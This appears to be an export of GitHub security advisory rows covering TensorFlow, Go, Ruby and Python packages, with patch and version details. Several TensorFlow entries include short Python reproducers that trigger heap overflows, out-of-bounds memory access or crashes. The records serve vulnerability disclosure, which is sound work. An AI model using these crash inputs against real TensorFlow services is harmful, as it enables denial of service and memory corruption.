This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
304,20741,tensorflow,GHSA-mq5c-prh3-3f3h,CVE-2021-29610,https://github.com/advisories/GHSA-mq5c-prh3-3f3h,low,2021-05-21 14:28:32 UTC,Invalid validation in `QuantizeAndDequantizeV2`,"### Impact
The validation in `tf.raw_ops.QuantizeAndDequantizeV2` allows invalid values for `axis` argument:

```python
import tensorflow as tf

input_tensor = tf.constant([0.0], shape=[1], dtype=float)
input_min = tf.constant(-10.0)
input_max = tf.constant(-10.0)

tf.raw_ops.QuantizeAndDequantizeV2(
  input=input_tensor, input_min=input_min, input_max=input_max,
  signed_input=False, num_bits=1, range_given=False, round_mode='HALF_TO_EVEN',
  narrow_range=False, axis=-2)
``` 

The [validation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74-L77) uses `||` to mix two different conditions:

```cc
OP_REQUIRES(ctx,
  (axis_ == -1 || axis_ < input.shape().dims()),
  errors::InvalidArgument(...));
```

If `axis_ < -1` the condition in `OP_REQUIRES` will still be true, but this value of `axis_` results in heap underflow. This allows attackers to read/write to other data on the heap.

### Patches
We have patched the issue in GitHub commit [c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9](https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
305,22051,crypto,GHSA-ffhg-7mh4-33c4,CVE-2020-9283,https://github.com/advisories/GHSA-ffhg-7mh4-33c4,moderate,2021-05-18 15:29:31 UTC,Improper Verification of Cryptographic Signature in golang.org/x/crypto,"golang.org/x/crypto before v0.0.0-20200220183623-bac4c82f6975 for Go allows a panic during signature verification in the golang.org/x/crypto/ssh package. A client can attack an SSH server that accepts public keys. Also, a server can attack any SSH client.",go
306,20741,tensorflow,GHSA-9rpc-5v9q-5r7f,CVE-2021-29611,https://github.com/advisories/GHSA-9rpc-5v9q-5r7f,low,2021-05-21 14:28:35 UTC,Incomplete validation in `SparseReshape`,"### Impact
Incomplete validation in `SparseReshape` results in a denial of service based on a `CHECK`-failure.

```python
import tensorflow as tf

input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)
input_shape = tf.zeros([11], dtype=tf.int64)
new_shape = tf.zeros([1], dtype=tf.int64)

tf.raw_ops.SparseReshape(input_indices=input_indices,
    input_shape=input_shape,
    new_shape=new_shape)
``` 
    
The [implementation](https://github.com/tensorflow/tensorflow/blob/e87b51ce05c3eb172065a6ea5f48415854223285/tensorflow/core/kernels/sparse_reshape_op.cc#L40) has no validation that the input arguments specify a valid sparse tensor.

### Patches 
We have patched the issue in GitHub commit [1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6](https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3, as these are the only affected versions.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
307,32116,lnd,GHSA-78hj-86cr-6j2v,CVE-2019-12999,https://github.com/advisories/GHSA-78hj-86cr-6j2v,high,2021-05-18 15:30:22 UTC,Improper Access Control in Lightning Network Daemon,Lightning Network Daemon (lnd) before 0.7 allows attackers to trigger loss of funds because of Incorrect Access Control.,go
308,20741,tensorflow,GHSA-2xgj-xhgf-ggjv,CVE-2021-29612,https://github.com/advisories/GHSA-2xgj-xhgf-ggjv,low,2021-05-21 14:28:37 UTC,Heap buffer overflow in `BandedTriangularSolve`,"### Impact
An attacker can trigger a heap buffer overflow in Eigen implementation of `tf.raw_ops.BandedTriangularSolve`:

```python
import tensorflow as tf
import numpy as np
  
matrix_array = np.array([])
matrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)
rhs_array = np.array([1,1])
rhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)
tf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/linalg/banded_triangular_solve_op.cc#L269-L278) calls `ValidateInputTensors` for input validation but fails to validate that the two tensors are not empty:
  
```cc
void ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0, const Tensor& in1) {
  OP_REQUIRES(
      ctx, in0.dims() >= 2, 
      errors::InvalidArgument(""In[0] ndims must be >= 2: "", in0.dims()));

  OP_REQUIRES(
      ctx, in1.dims() >= 2,
      errors::InvalidArgument(""In[1] ndims must be >= 2: "", in1.dims()));
}
``` 

Furthermore, since `OP_REQUIRES` macro only stops execution of current function after setting `ctx->status()` to a non-OK value, callers of helper functions that use `OP_REQUIRES` must check value of `ctx->status()` before continuing. This doesn't happen [in this op's implementation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/linalg/banded_triangular_solve_op.cc#L219), hence the validation that is present is also not effective.

### Patches
We have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [0ab290774f91a23bebe30a358fde4e53ab4876a0](https://github.com/tensorflow/tensorflow/commit/0ab290774f91a23bebe30a358fde4e53ab4876a0).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.",pip
309,20741,tensorflow,GHSA-vvg4-vgrv-xfr7,CVE-2021-29613,https://github.com/advisories/GHSA-vvg4-vgrv-xfr7,moderate,2021-05-21 14:28:39 UTC,Incomplete validation in `tf.raw_ops.CTCLoss`,"### Impact 
Incomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:

```python
import tensorflow as tf

inputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)
labels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)
labels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)
sequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)
  
tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=True)
```   
      
An attacker can also trigger a heap buffer overflow:

```python
import tensorflow as tf

inputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)
labels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)
labels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)
sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=False)
```

Finally, an attacker can trigger a null pointer dereference:

```python 
import tensorflow as tf

inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)
labels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)
labels_values = tf.constant([], shape=[0], dtype=tf.int32)
sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=False)
```

### Patches
We have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
310,30721,django-celery-results,GHSA-fvx8-v524-8579,CVE-2020-17495,https://github.com/advisories/GHSA-fvx8-v524-8579,high,2021-06-04 21:46:52 UTC,django-celery-results vulnerable to Cleartext Storage of Sensitive Information,"django-celery-results prior to 2.4.0 stores task results in the database. Among the data it stores are the variables passed into the tasks. The variables may contain sensitive cleartext information that does not belong unencrypted in the database.

In version 2.4.0 this is no longer the default behaviour but can be re-enabled with the `result_extended` flag in which case care should be taken to ensure any sensitive variables are scrubbed - see [here](https://github.com/celery/django-celery-results/issues/154#issuecomment-734706270) for an example.",pip
311,22115,go-dockerclient,GHSA-vj3f-3286-r4pf,CVE-2014-9356,https://github.com/advisories/GHSA-vj3f-3286-r4pf,high,2021-05-18 21:09:17 UTC,Path Traversal in Docker,Path traversal vulnerability in Docker before 1.3.3 allows remote attackers to write to arbitrary files and bypass a container protection mechanism via a full pathname in a symlink in an (1) image or (2) build in a Dockerfile.,go
312,20741,tensorflow,GHSA-8pmx-p244-g88h,CVE-2021-29614,https://github.com/advisories/GHSA-8pmx-p244-g88h,high,2021-05-21 14:28:42 UTC,Interpreter crash from `tf.io.decode_raw`,"### Impact
The implementation of `tf.io.decode_raw` produces incorrect results and crashes the Python interpreter when combining `fixed_length` and wider datatypes.

```python
import tensorflow as tf

tf.io.decode_raw(tf.constant([""1"",""2"",""3"",""4""]), tf.uint16, fixed_length=4)
```                
                   
The [implementation of the padded version](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc) is buggy due to a confusion about pointer arithmetic rules.

First, the code [computes](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L61) the width of each output element by dividing the `fixed_length` value to the size of the type argument:

```cc
int width = fixed_length / sizeof(T);
```

The `fixed_length` argument is also used to determine the [size needed for the output tensor](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L63-L79):

```cc
TensorShape out_shape = input.shape();
out_shape.AddDim(width);
Tensor* output_tensor = nullptr;
OP_REQUIRES_OK(context, context->allocate_output(""output"", out_shape, &output_tensor));

auto out = output_tensor->flat_inner_dims<T>();
T* out_data = out.data();
memset(out_data, 0, fixed_length * flat_in.size());
```

This is followed by [reencoding code](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L85-L94):

```cc
for (int64 i = 0; i < flat_in.size(); ++i) {
  const T* in_data = reinterpret_cast<const T*>(flat_in(i).data());

  if (flat_in(i).size() > fixed_length) {
    memcpy(out_data, in_data, fixed_length);
  } else {
    memcpy(out_data, in_data, flat_in(i).size());
  }
  out_data += fixed_length;
}
```

The erroneous code is the last line above: it is moving the `out_data` pointer by `fixed_length * sizeof(T)` bytes whereas it only copied at most `fixed_length` bytes from the input. This results in parts of the input not being decoded into the output.

Furthermore, because the pointer advance is far wider than desired, this quickly leads to writing to outside the bounds of the backing data. This OOB write leads to interpreter crash in the reproducer mentioned here, but more severe attacks can be mounted too, given that this gadget allows writing to periodically placed locations in memory.

### Patches
We have patched the issue in GitHub commit [698e01511f62a3c185754db78ebce0eee1f0184d](https://github.com/tensorflow/tensorflow/commit/698e01511f62a3c185754db78ebce0eee1f0184d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
313,20741,tensorflow,GHSA-qw5h-7f53-xrp6,CVE-2021-29615,https://github.com/advisories/GHSA-qw5h-7f53-xrp6,low,2021-05-21 14:28:45 UTC,Stack overflow in `ParseAttrValue` with nested tensors,"### Impact
The implementation of [`ParseAttrValue`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/framework/attr_value_util.cc#L397-L453) can be tricked into stack overflow due to recursion by giving in a specially crafted input.

### Patches
We have patched the issue in GitHub commit [e07e1c3d26492c06f078c7e5bf2d138043e199c1](https://github.com/tensorflow/tensorflow/commit/e07e1c3d26492c06f078c7e5bf2d138043e199c1).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
314,20741,tensorflow,GHSA-4hvv-7x94-7vq8,CVE-2021-29616,https://github.com/advisories/GHSA-4hvv-7x94-7vq8,low,2021-05-21 14:28:47 UTC,Null dereference in Grappler's `TrySimplify`,"### Impact
The implementation of [`TrySimplify`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/grappler/optimizers/arithmetic_optimizer.cc#L390-L401) has undefined behavior due to dereferencing a null pointer in corner cases that
result in optimizing a node with no inputs.

### Patches
We have patched the issue in GitHub commit [e6340f0665d53716ef3197ada88936c2a5f7a2d3](https://github.com/tensorflow/tensorflow/commit/e6340f0665d53716ef3197ada88936c2a5f7a2d3).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
315,20741,tensorflow,GHSA-mmq6-q8r3-48fm,CVE-2021-29617,https://github.com/advisories/GHSA-mmq6-q8r3-48fm,low,2021-05-21 14:28:50 UTC,Crash in `tf.strings.substr` due to `CHECK`-fail,"### Impact
An attacker can cause a denial of service via `CHECK`-fail in  `tf.strings.substr` with invalid arguments:

```python 
import tensorflow as tf
tf.strings.substr(input='abc', len=1, pos=[1,-1])
```

```python
import tensorflow as tf
tf.strings.substr(input='abc', len=1, pos=[1,2])
```

### Patches
We have received a patch for the issue in GitHub commit [890f7164b70354c57d40eda52dcdd7658677c09f](https://github.com/tensorflow/tensorflow/commit/890f7164b70354c57d40eda52dcdd7658677c09f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported in [#46900](https://github.com/tensorflow/issues/46900) and fixed in [#46974](https://github.com/tensorflow/issues/46974).",pip
316,20741,tensorflow,GHSA-xqfj-cr6q-pc8w,CVE-2021-29618,https://github.com/advisories/GHSA-xqfj-cr6q-pc8w,low,2021-05-21 14:28:58 UTC,Crash in `tf.transpose` with complex inputs,"### Impact
Passing a complex argument to `tf.transpose` at the same time as passing `conjugate=True` argument results in a crash:

```python 
import tensorflow as tf
tf.transpose(conjugate=True, a=complex(1))
```

### Patches
We have received a patch for the issue in GitHub commit [1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88](https://github.com/tensorflow/tensorflow/commit/1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported in [#42105](https://github.com/tensorflow/issues/42105) and fixed in [#46973](https://github.com/tensorflow/issues/46973).",pip
317,31626,thrift/lib/go/thrift,GHSA-jq7p-26h5-w78r,CVE-2019-0210,https://github.com/advisories/GHSA-jq7p-26h5-w78r,high,2021-05-18 15:32:04 UTC,Out-of-bounds read in Apache Thrift,"In Apache Thrift 0.9.3 to 0.12.0, a server implemented in Go using TJSONProtocol or TSimpleJSONProtocol may panic when feed with invalid input data.",go
318,20741,tensorflow,GHSA-wvjw-p9f5-vq28,CVE-2021-29619,https://github.com/advisories/GHSA-wvjw-p9f5-vq28,low,2021-05-21 14:29:02 UTC,Segfault in `tf.raw_ops.SparseCountSparseOutput`,"### Impact
Passing invalid arguments (e.g., discovered via fuzzing) to `tf.raw_ops.SparseCountSparseOutput` results in segfault.

### Patches
We have patched the issue in GitHub commit [82e6203221865de4008445b13c69b6826d2b28d9](https://github.com/tensorflow/tensorflow/commit/82e6203221865de4008445b13c69b6826d2b28d9).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
319,31880,pkg/apiserver,GHSA-pmqp-h87c-mr78,CVE-2019-11253,https://github.com/advisories/GHSA-pmqp-h87c-mr78,high,2021-05-18 15:38:48 UTC,XML Entity Expansion and Improper Input Validation in Kubernetes API server,"Improper input validation in the Kubernetes API server in versions v1.0-1.12 and versions prior to v1.13.12, v1.14.8, v1.15.5, and v1.16.2 allows authorized users to send malicious YAML or JSON payloads, causing the API server to consume excessive CPU or memory, potentially crashing and becoming unavailable. Prior to v1.14.0, default RBAC policy authorized anonymous users to submit requests that could trigger this vulnerability. Clusters upgraded from a version prior to v1.14.0 keep the more permissive policy by default for backwards compatibility.",go
320,24294,kube-state-metrics,GHSA-2v6x-frw8-7r7f,CVE-2019-17110,https://github.com/advisories/GHSA-2v6x-frw8-7r7f,moderate,2021-05-18 15:38:54 UTC,Exposure of Sensitive Information to an Unauthorized Actor in kube-state-metrics,"A security issue was discovered in kube-state-metrics 1.7.x before 1.7.2. An experimental feature was added to v1.7.0 and v1.7.1 that enabled annotations to be exposed as metrics. By default, kube-state-metrics metrics only expose metadata about Secrets. However, a combination of the default kubectl behavior and this new feature can cause the entire secret content to end up in metric labels, thus inadvertently exposing the secret content in metrics.",go
321,18823,nokogiri,GHSA-7rrm-v45f-jp64,,https://github.com/advisories/GHSA-7rrm-v45f-jp64,moderate,2021-05-17 20:52:05 UTC,Update packaged dependency libxml2 from 2.9.10 to 2.9.12,"### Summary

Nokogiri v1.11.4 updates the vendored libxml2 from v2.9.10 to v2.9.12 which addresses:

- [CVE-2019-20388](https://security.archlinux.org/CVE-2019-20388) (Medium severity)
- [CVE-2020-24977](https://security.archlinux.org/CVE-2020-24977) (Medium severity)
- [CVE-2021-3517](https://security.archlinux.org/CVE-2021-3517) (Medium severity)
- [CVE-2021-3518](https://security.archlinux.org/CVE-2021-3518) (Medium severity)
- [CVE-2021-3537](https://security.archlinux.org/CVE-2021-3537) (Low severity)
- [CVE-2021-3541](https://security.archlinux.org/CVE-2021-3541) (Low severity)

Note that two additional CVEs were addressed upstream but are not relevant to this release. [CVE-2021-3516](https://security.archlinux.org/CVE-2021-3516) via `xmllint` is not present in Nokogiri, and [CVE-2020-7595](https://security.archlinux.org/CVE-2020-7595) has been patched in Nokogiri since v1.10.8 (see #1992).

Please note that this advisory only applies to the CRuby implementation of Nokogiri `< 1.11.4`, and only if the packaged version of libxml2 is being used. If you've overridden defaults at installation time to use system libraries instead of packaged libraries, you should instead pay attention to your distro's `libxml2` release announcements.


### Mitigation

Upgrade to Nokogiri `>= 1.11.4`.


### Impact

I've done a brief analysis of the published CVEs that are addressed in this upstream release. The libxml2 maintainers have not released a canonical set of CVEs, and so this list is pieced together from secondary sources and may be incomplete.

All information below is sourced from [security.archlinux.org](https://security.archlinux.org), which appears to have the most up-to-date information as of this analysis.

#### [CVE-2019-20388](https://security.archlinux.org/CVE-2019-20388)

- **Severity**: Medium
- **Type**: Denial of service
- **Description**: A memory leak was found in the xmlSchemaValidateStream function of libxml2. Applications that use this library may be vulnerable to memory not being freed leading to a denial of service.
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/commit/7ffcd44d7e6c46704f8af0321d9314cd26e0e18a

Verified that the fix commit first appears in v2.9.11. It seems possible that this issue would be present in programs using Nokogiri < v1.11.4.


#### [CVE-2020-7595](https://security.archlinux.org/CVE-2020-7595)

- **Severity**: Medium
- **Type**: Denial of service
- **Description**: xmlStringLenDecodeEntities in parser.c in libxml2 2.9.10 has an infinite loop in a certain end-of-file situation.
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/commit/0e1a49c8907645d2e155f0d89d4d9895ac5112b5

This has been patched in Nokogiri since v1.10.8 (see #1992).


#### [CVE-2020-24977](https://security.archlinux.org/CVE-2020-24977)

- **Severity**: Medium
- **Type**: Information disclosure
- **Description**: GNOME project libxml2 <= 2.9.10 has a global buffer over-read vulnerability in xmlEncodeEntitiesInternal at libxml2/entities.c.
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/commit/50f06b3efb638efb0abd95dc62dca05ae67882c2

Verified that the fix commit first appears in v2.9.11. It seems possible that this issue would be present in programs using Nokogiri < v1.11.4.


#### [CVE-2021-3516](https://security.archlinux.org/CVE-2021-3516)

- **Severity**: Medium
- **Type**: Arbitrary code execution (no remote vector)
- **Description**: A use-after-free security issue was found libxml2 before version 2.9.11 when ""xmllint --html --push"" is used to process crafted files.
- **Issue**: https://gitlab.gnome.org/GNOME/libxml2/-/issues/230
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/-/commit/1358d157d0bd83be1dfe356a69213df9fac0b539

Verified that the fix commit first appears in v2.9.11. This vector does not exist within Nokogiri, which does not ship `xmllint`.


#### [CVE-2021-3517](https://security.archlinux.org/CVE-2021-3517)

- **Severity**: Medium
- **Type**: Arbitrary code execution
- **Description**: A heap-based buffer overflow was found in libxml2 before version 2.9.11 when processing truncated UTF-8 input.
- **Issue**: https://gitlab.gnome.org/GNOME/libxml2/-/issues/235
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/-/commit/bf22713507fe1fc3a2c4b525cf0a88c2dc87a3a2

Verified that the fix commit first appears in v2.9.11. It seems possible that this issue would be present in programs using Nokogiri < v1.11.4.


#### [CVE-2021-3518](https://security.archlinux.org/CVE-2021-3518)

- **Severity**: Medium
- **Type**: Arbitrary code execution
- **Description**: A use-after-free security issue was found in libxml2 before version 2.9.11 in xmlXIncludeDoProcess() in xinclude.c when processing crafted files.
- **Issue**: https://gitlab.gnome.org/GNOME/libxml2/-/issues/237
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/-/commit/1098c30a040e72a4654968547f415be4e4c40fe7

Verified that the fix commit first appears in v2.9.11. It seems possible that this issue would be present in programs using Nokogiri < v1.11.4.


#### [CVE-2021-3537](https://security.archlinux.org/CVE-2021-3537)

- **Severity**: Low
- **Type**: Denial of service
- **Description**: It was found that libxml2 before version 2.9.11 did not propagate errors while parsing XML mixed content, causing a NULL dereference. If an untrusted XML document was parsed in recovery mode and post-validated, the flaw could be used to crash the application.
- **Issue**: https://gitlab.gnome.org/GNOME/libxml2/-/issues/243
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/-/commit/babe75030c7f64a37826bb3342317134568bef61

Verified that the fix commit first appears in v2.9.11. It seems possible that this issue would be present in programs using Nokogiri < v1.11.4.


#### [CVE-2021-3541](https://security.archlinux.org/CVE-2021-3541)

- **Severity**: Low
- **Type**: Denial of service
- **Description**: A security issue was found in libxml2 before version 2.9.11. Exponential entity expansion attack its possible bypassing all existing protection mechanisms and leading to denial of service.
- **Fixed**: https://gitlab.gnome.org/GNOME/libxml2/-/commit/8598060bacada41a0eb09d95c97744ff4e428f8e

Verified that the fix commit first appears in v2.9.11. It seems possible that this issue would be present in programs using Nokogiri < v1.11.4, however Nokogiri's default parse options prevent the attack from succeeding (it is necessary to opt into `DTDLOAD` which is off by default).

For more details supporting this analysis of this CVE, please visit #2233.
",rubygems
322,20332,Flask-Caching,GHSA-656c-6cxf-hvcv,CVE-2021-33026,https://github.com/advisories/GHSA-656c-6cxf-hvcv,moderate,2021-06-18 18:33:40 UTC,Deserialization of Untrusted Data in Flask-Caching,"Flask-Cache adds easy cache support to Flask. The Flask-Caching extension through 1.10.1 for Flask relies on Pickle for serialization, which may lead to remote code execution or local privilege escalation. If an attacker gains access to cache storage (e.g., filesystem, Memcached, Redis, etc.), they can construct a crafted payload, poison the cache, and execute Python code.

However, this is not a high-severity issue, as for an attack like this to work, an attacker must:

1. Be able to write arbitrary values to the cache
2. Be able to generate a cache key that will collide with a value being read by the application
3. Cause the application to read a maliciously-injected value

Any situation where all 3 of those is true is a situation where the application has larger problems; for example, if someone's able to inject malicious cached rendered pages into a Flask app's cache, then they can make the website say literally anything they want, regardless of whether it involves the execution of remote code. Basically, the Pickle vulnerability follows from a website already being extremely vulnerable (due to conditions 1 and 2 being met).",pip
323,22581,libseccomp-golang,GHSA-58v3-j75h-xr49,CVE-2017-18367,https://github.com/advisories/GHSA-58v3-j75h-xr49,high,2021-05-18 15:44:30 UTC,Improper Input Validation in libseccomp-golang,libseccomp-golang 0.9.0 and earlier incorrectly generates BPFs that OR multiple arguments rather than ANDing them. A process running under a restrictive seccomp filter that specified multiple syscall arguments could bypass intended access restrictions by specifying a single matching argument.,go
324,18996,em-http-request,GHSA-q27f-v3r6-9v77,CVE-2020-13482,https://github.com/advisories/GHSA-q27f-v3r6-9v77,high,2021-05-24 18:13:13 UTC,Improper Certificate Validation in EM-HTTP-Request,EM-HTTP-Request 1.1.5 uses the library eventmachine in an insecure way that allows an attacker to perform a man-in-the-middle attack against users of the library. The hostname in a TLS server certificate is not verified.,rubygems
325,19766,reel,GHSA-x3v4-pxvm-63j8,CVE-2020-7659,https://github.com/advisories/GHSA-x3v4-pxvm-63j8,moderate,2021-05-24 18:13:36 UTC,HTTP Request Smuggling in reel,"reel through 0.6.1 allows Request Smuggling attacks due to incorrect Content-Length and Transfer encoding header parsing. It is possible to conduct HTTP request smuggling attacks by sending the Content-Length header twice. Furthermore, invalid Transfer Encoding headers were found to be parsed as valid which could be leveraged for TECL smuggling attacks. Note, This project is deprecated, and is not maintained any more.",rubygems
326,20022,pydantic,GHSA-5jqp-qgf6-3pvh,CVE-2021-29510,https://github.com/advisories/GHSA-5jqp-qgf6-3pvh,low,2021-05-13 20:23:17 UTC,"Use of ""infinity"" as an input to datetime and date fields causes infinite loop in pydantic","
Impact

Passing either 'infinity', 'inf' or float('inf') (or their negatives) to datetime or date fields causes validation to run forever with 100% CPU usage (on one CPU).
Patches

Pydantic is be patched with fixes available in the following versions:

    v1.8.2
    v1.7.4
    v1.6.2

All these versions are available on pypi, and will be available on conda-forge soon.

See the changelog for details.
Workarounds

If you absolutely can't upgrade, you can work around this risk using a validator to catch these values, brief demo:

from datetime import date
from pydantic import BaseModel, validator

class DemoModel(BaseModel):
    date_of_birth: date

    @validator('date_of_birth', pre=True)
    def skip_infinite_values(cls, v):
        try:
            seconds = float(v)
        except (ValueError, TypeError):
            return v
        else:
            if seconds == float('inf'):
                return date.max
            elif seconds == float('-inf'):
                return date.min
            else:
                return seconds

Note: this is not an ideal solution (in particular you'll need a slightly different function for datetimes), instead of a hack like this you should upgrade pydantic.

If you are not using v1.8.x, v1.7.x or v1.6.x and are unable to upgrade to a fixed version of pydantic, please create an issue requesting a back-port, and we will endeavour to release a patch for earlier versions of pydantic.
References

This was fixed in commit 7e83fdd.
",pip
327,19538,goliath,GHSA-3892-2r52-p65m,CVE-2020-7671,https://github.com/advisories/GHSA-3892-2r52-p65m,moderate,2021-05-24 18:20:07 UTC,HTTP Request Smuggling in goliath,"goliath through 1.0.6 allows request smuggling attacks where goliath is used as a backend and a frontend proxy also being vulnerable. It is possible to conduct HTTP request smuggling attacks by sending the Content-Length header twice. Furthermore, invalid Transfer Encoding headers were found to be parsed as valid which could be leveraged for TE:CL smuggling attacks.",rubygems
